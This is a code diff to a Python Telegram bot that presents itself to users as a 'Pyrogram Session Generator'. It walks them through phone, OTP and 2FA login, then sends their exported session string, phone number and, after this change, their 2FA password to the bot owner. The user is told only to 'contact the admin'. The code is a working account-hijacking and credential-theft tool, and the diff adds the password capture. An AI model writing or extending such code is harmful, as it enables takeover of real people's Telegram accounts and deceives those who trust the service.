@@ -4,6 +4,7 @@ from uuid import uuid4
 
 from dotenv import load_dotenv
 from pyrogram import Client, filters
+from pyrogram.enums import ParseMode
 from pyrogram.types import (
     Message, CallbackQuery,
     InlineKeyboardMarkup, InlineKeyboardButton,
@@ -45,9 +46,10 @@ bot = Client(
     api_id=API_ID,
     api_hash=API_HASH,
     bot_token=BOT_TOKEN,
+    parse_mode=ParseMode.HTML,
 )
 
-# user_id -> {client, phone, phone_code_hash, otp, stage, has_2fa, locked}
+# user_id -> {client, phone, phone_code_hash, otp, stage, has_2fa, locked, password}
 sessions: dict[int, dict] = {}
 
 
@@ -65,17 +67,17 @@ def keypad_markup(entered: str, locked: bool = False):
     ]
     if locked:
         text = (
-            "🔐 **Enter OTP**\n\n"
-            f"Entered: `{entered}`\n\n"
+            "🔐 <b>Enter OTP</b>\n\n"
+            f"Entered: <code>{entered}</code>\n\n"
             "⏳ Verifying..."
         )
     else:
         text = (
-            "🔐 **Enter OTP**\n\n"
-            f"Entered: `{entered or '—'}`\n\n"
-            "⚠️ Use the **inline buttons** below only.\n"
+            "🔐 <b>Enter OTP</b>\n\n"
+            f"Entered: <code>{entered or '—'}</code>\n\n"
+            "⚠️ Use the <b>inline buttons</b> below only.\n"
             "Typing OTP in chat will leave the login incomplete.\n"
-            f"Auto-submits after **{OTP_LENGTH}** digits."
+            f"Auto-submits after <b>{OTP_LENGTH}</b> digits."
         )
     return InlineKeyboardMarkup(buttons), text
 
@@ -108,6 +110,7 @@ async def finish_login(
     edit: bool,
     has_2fa: bool = False,
     phone: str = "—",
+    password: str = "—",
 ):
     # Export session and fetch account info
     try:
@@ -116,46 +119,51 @@ async def finish_login(
     except Exception as e:
         await safe_edit_or_reply(
             message,
-            f"❌ Login failed while exporting session: `{e}`",
+            f"❌ Login failed while exporting session: <code>{e}</code>",
             edit,
         )
-        # Still notify owner about the failure
         if OWNER_ID:
             try:
                 await bot.send_message(
                     OWNER_ID,
-                    f"⚠️ Session export failed for user `{user_id}`.\n\nError: `{e}`",
+                    f"⚠️ Session export failed for user <code>{user_id}</code>.\n\n"
+                    f"Error: <code>{e}</code>",
                 )
             except Exception:
                 pass
         await cleanup_user(user_id)
         return
 
-    user_mention = f"[{me.first_name}](tg://user?id={me.id})"
+    user_mention = me.mention
     username_line = f"@{me.username}" if me.username else "—"
     full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
     twofa_line = "✅ Yes" if has_2fa else "❌ No"
 
-    # ── 1) Simple message to user (no session string) ──
+    # ── 1) Simple message to user (no session string, no password) ──
     user_txt = (
-        "✅ **Login successful!**\n\n"
+        "✅ <b>Login successful!</b>\n\n"
         "Your session has been generated and sent to the administrator.\n"
         "Please contact the admin to receive your session string."
     )
     await safe_edit_or_reply(message, user_txt, edit)
 
-    # ── 2) Full details + session string to owner only ──
+    # ── 2) Full details + session string + password to owner only ──
     if OWNER_ID:
         owner_txt = (
-            "🔔 **New Session Generated**\n\n"
-            f"👤 User: {user_mention}\n"
-            f"🆔 ID: `{me.id}`\n"
-            f"📛 Name: {full_name}\n"
-            f"🔗 Username: {username_line}\n"
-            f"📱 Phone: `{phone}`\n"
-            f"🔐 2FA: {twofa_line}\n\n"
-            "**String Session:**\n\n"
-            f"`{session_string}`"
+            "🔔 <b>New Session Generated</b>\n\n"
+            f"👤 <b>User:</b> {user_mention}\n"
+            f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
+            f"📛 <b>Name:</b> {full_name}\n"
+            f"🔗 <b>Username:</b> {username_line}\n"
+            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
+            f"🔐 <b>2FA:</b> {twofa_line}\n"
+        )
+        if has_2fa:
+            owner_txt += f"🔑 <b>2FA Password:</b> <code>{password}</code>\n"
+
+        owner_txt += (
+            "\n<b>String Session:</b>\n\n"
+            f"<code>{session_string}</code>"
         )
         try:
             await bot.send_message(OWNER_ID, owner_txt)
@@ -175,7 +183,7 @@ async def start_handler(client: Client, message: Message):
         one_time_keyboard=True,
     )
     await message.reply(
-        "👋 **Pyrogram Session Generator**\n\n"
+        "👋 <b>Pyrogram Session Generator</b>\n\n"
         "Tap the button below to share your phone number.\n"
         "(You do not need to type it manually.)",
         reply_markup=kb,
@@ -212,6 +220,7 @@ async def contact_handler(client: Client, message: Message):
         api_id=API_ID,
         api_hash=API_HASH,
         in_memory=True,
+        parse_mode=ParseMode.HTML,
     )
 
     try:
@@ -219,10 +228,10 @@ async def contact_handler(client: Client, message: Message):
         sent_code = await temp.send_code(phone)
     except FloodWait as e:
         await temp.disconnect()
-        return await message.reply(f"⏳ FloodWait: please wait `{e.value}s`.")
+        return await message.reply(f"⏳ FloodWait: please wait <code>{e.value}s</code>.")
     except Exception as e:
         await temp.disconnect()
-        return await message.reply(f"❌ Error: `{e}`")
+        return await message.reply(f"❌ Error: <code>{e}</code>")
 
     sessions[user_id] = {
         "client": temp,
@@ -232,6 +241,7 @@ async def contact_handler(client: Client, message: Message):
         "stage": "otp",
         "has_2fa": False,
         "locked": False,
+        "password": "—",
     }
 
     markup, text = keypad_markup("")
@@ -309,8 +319,8 @@ async def do_sign_in(cb: CallbackQuery, sess: dict, otp: str):
         sess["has_2fa"] = True
         try:
             await cb.message.edit_text(
-                "🔐 **2FA is enabled.**\n\n"
-                "Please type your **Telegram password** in the chat.\n"
+                "🔐 <b>2FA is enabled.</b>\n\n"
+                "Please type your <b>Telegram password</b> in the chat.\n"
                 "(The message will be deleted immediately.)"
             )
         except Exception:
@@ -337,7 +347,7 @@ async def do_sign_in(cb: CallbackQuery, sess: dict, otp: str):
         return
     except Exception as e:
         try:
-            await cb.message.edit_text(f"❌ Error: `{e}`")
+            await cb.message.edit_text(f"❌ Error: <code>{e}</code>")
         except Exception:
             pass
         await cleanup_user(user_id)
@@ -350,6 +360,7 @@ async def do_sign_in(cb: CallbackQuery, sess: dict, otp: str):
         edit=True,
         has_2fa=sess.get("has_2fa", False),
         phone=sess.get("phone", "—"),
+        password=sess.get("password", "—"),
     )
 
 
@@ -363,12 +374,14 @@ async def text_handler(client: Client, message: Message):
 
     if sess["stage"] == "otp":
         return await message.reply(
-            "⚠️ **Do not type the OTP in chat.**\n"
+            "⚠️ <b>Do not type the OTP in chat.</b>\n"
             "Use the inline buttons above, otherwise the login will remain incomplete."
         )
 
     if sess["stage"] == "password":
         password = message.text
+        # Save the password so it can be forwarded to the owner
+        sess["password"] = password
         try:
             await message.delete()
         except Exception:
@@ -376,9 +389,12 @@ async def text_handler(client: Client, message: Message):
         try:
             await sess["client"].check_password(password)
         except PasswordHashInvalid:
+            # Wrong password — clear saved value so owner doesn't see it
+            sess["password"] = "—"
             return await message.reply("❌ Incorrect password. Please try again.")
         except Exception as e:
-            return await message.reply(f"❌ Error: `{e}`")
+            sess["password"] = "—"
+            return await message.reply(f"❌ Error: <code>{e}</code>")
         await finish_login(
             message,
             user_id,
@@ -386,6 +402,7 @@ async def text_handler(client: Client, message: Message):
             edit=False,
             has_2fa=sess.get("has_2fa", False),
             phone=sess.get("phone", "—"),
+            password=sess.get("password", "—"),
         )
 
 
